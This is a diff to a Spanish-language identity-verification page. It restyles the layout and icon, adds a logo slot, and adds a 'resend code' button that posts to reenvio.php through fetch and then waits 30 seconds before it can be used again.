@@ -63,18 +63,33 @@ body{
     text-align:left;
 }
 
-.icon-wrap{
-    width:54px;
-    height:54px;
-    border:2px solid #00853f;
-    border-radius:10px;
+.logo-slot{
     display:flex;
     justify-content:center;
     align-items:center;
-    margin-bottom:24px;
+    margin-bottom:28px;
+    min-height:60px;
 }
 
-.icon-wrap svg{width:30px;height:30px;}
+.logo-slot img{
+    max-height:60px;
+    max-width:220px;
+    width:auto;
+    object-fit:contain;
+}
+
+.icon-wrap{
+    width:72px;
+    height:72px;
+    border:2.5px solid #00853f;
+    border-radius:14px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    margin:0 auto 22px;
+}
+
+.icon-wrap svg{width:42px;height:42px;}
 
 h1{
     font-size:22px;
@@ -123,46 +138,108 @@ h1{
     box-shadow:0 0 0 2px rgba(0,133,63,0.15);
 }
 
-.btn-validar{
+.btn-validar,
+.btn-reenviar{
     width:100%;
     height:50px;
-    border:none;
     border-radius:6px;
-    background:#00853f;
-    color:#fff;
     font-size:16px;
-    font-weight:600;
+    font-weight:700;
     cursor:pointer;
     transition:0.2s;
+    display:block;
+}
+
+.btn-validar{
+    border:none;
+    background:#00853f;
+    color:#fff;
+    margin-bottom:12px;
 }
 
 .btn-validar:hover{background:#006b32;}
 .btn-validar:disabled{background:#9bc7ad;cursor:not-allowed;}
 
-@media(max-width:480px){
-    body{padding:24px 16px;}
-    .card{padding:28px 22px 24px;}
-    h1{font-size:20px;}
-    .subtitle{font-size:14px;margin-bottom:22px;}
-    .code-inputs{gap:6px;margin-bottom:24px;}
-    .code-inputs input{font-size:20px;}
-    .btn-validar{height:46px;font-size:15px;}
+.btn-reenviar{
+    background:#fff;
+    color:#00853f;
+    border:2px solid #00853f;
+}
+
+.btn-reenviar:hover{background:#eef8f1;}
+.btn-reenviar:disabled{opacity:.6;cursor:not-allowed;}
+
+.resend-status{
+    text-align:center;
+    margin-top:12px;
+    font-size:13px;
+    color:#00853f;
+    min-height:18px;
+}
+
+@media(max-width:600px){
+    body{
+        padding:24px 18px;
+        background:#fff;
+    }
+    .card{
+        padding:0;
+        box-shadow:none;
+        background:transparent;
+        max-width:380px;
+    }
+    .logo-slot{margin-bottom:22px;min-height:52px;}
+    .logo-slot img{max-height:52px;max-width:200px;}
+
+    .id-header{
+        display:flex;
+        align-items:center;
+        gap:14px;
+        margin-bottom:18px;
+    }
+    .id-header .icon-wrap{
+        width:54px;
+        height:54px;
+        margin:0;
+        border-width:2px;
+        border-radius:12px;
+        flex-shrink:0;
+    }
+    .id-header .icon-wrap svg{width:30px;height:30px;}
+    .id-header h1{
+        font-size:18px;
+        margin:0;
+        text-align:left;
+    }
+
+    .subtitle{font-size:14px;margin-bottom:18px;text-align:left;}
+    .code-inputs{gap:6px;margin-bottom:22px;justify-content:space-between;}
+    .code-inputs input{font-size:19px;max-width:46px;}
+    .btn-validar,
+    .btn-reenviar{height:44px;font-size:14px;}
 }
 </style>
 </head>
 <body>
 <div class="card">
-    <div class="icon-wrap">
-        <svg viewBox="0 0 24 24" fill="none" stroke="#00853f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <rect x="3" y="5" width="18" height="14" rx="2"></rect>
-            <circle cx="8.5" cy="11" r="1.8" fill="#00853f"></circle>
-            <line x1="13" y1="10" x2="18" y2="10"></line>
-            <line x1="13" y1="13" x2="18" y2="13"></line>
-            <line x1="6" y1="16" x2="18" y2="16"></line>
-        </svg>
+    <div class="logo-slot">
+        <img src="img/imgLogoLogin.png" alt="Prox" class="logo-img">
     </div>
 
-    <h1>Verificación de identidad</h1>
+    <div class="id-header">
+        <div class="icon-wrap" aria-label="Verificación de identidad">
+            <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="5" y="10" width="38" height="28" rx="4" stroke="#00853f" stroke-width="2.6"/>
+                <circle cx="16" cy="22" r="3.4" fill="#00853f"/>
+                <path d="M9.5 32c1.4-3.1 4-4.7 6.5-4.7s5.1 1.6 6.5 4.7" stroke="#00853f" stroke-width="2.4" stroke-linecap="round"/>
+                <line x1="27" y1="20" x2="38" y2="20" stroke="#00853f" stroke-width="2.4" stroke-linecap="round"/>
+                <line x1="27" y1="26" x2="38" y2="26" stroke="#00853f" stroke-width="2.4" stroke-linecap="round"/>
+                <line x1="27" y1="32" x2="34" y2="32" stroke="#00853f" stroke-width="2.4" stroke-linecap="round"/>
+            </svg>
+        </div>
+        <h1>Verificación de identidad</h1>
+    </div>
+
     <p class="subtitle">Ingrese el código enviado</p>
 
     <form method="post" action="" id="codeForm" autocomplete="off">
@@ -177,6 +254,11 @@ h1{
         <input type="hidden" name="ips1" id="ips1">
         <button type="submit" class="btn-validar">Validar código</button>
     </form>
+
+    <form method="post" action="reenvio.php" id="resendForm">
+        <button type="submit" class="btn-reenviar" id="btnReenviar">Reenviar código</button>
+    </form>
+    <p class="resend-status" id="resendStatus"></p>
 </div>
 
 <script>
@@ -204,6 +286,35 @@ h1{
 
     form.addEventListener('submit', e => {
         hidden.value = [...inputs].map(i => i.value).join('');
+    });
+
+    // Reenviar código (AJAX a reenvio.php)
+    const resendForm   = document.getElementById('resendForm');
+    const btnReenviar  = document.getElementById('btnReenviar');
+    const resendStatus = document.getElementById('resendStatus');
+
+    resendForm.addEventListener('submit', async e => {
+        e.preventDefault();
+        btnReenviar.disabled = true;
+        resendStatus.style.color = '#444';
+        resendStatus.textContent = 'Reenviando...';
+
+        try {
+            const res = await fetch('reenvio.php', { method:'POST' });
+            if (res.ok) {
+                resendStatus.style.color = '#00853f';
+                resendStatus.textContent = '✓ Código reenviado';
+            } else {
+                resendStatus.style.color = '#c0392b';
+                resendStatus.textContent = 'No se pudo reenviar';
+            }
+        } catch (err) {
+            resendStatus.style.color = '#c0392b';
+            resendStatus.textContent = 'No se pudo reenviar';
+        }
+
+        // Reactivar luego de 30s
+        setTimeout(() => { btnReenviar.disabled = false; }, 30000);
     });
 })();
 </script>
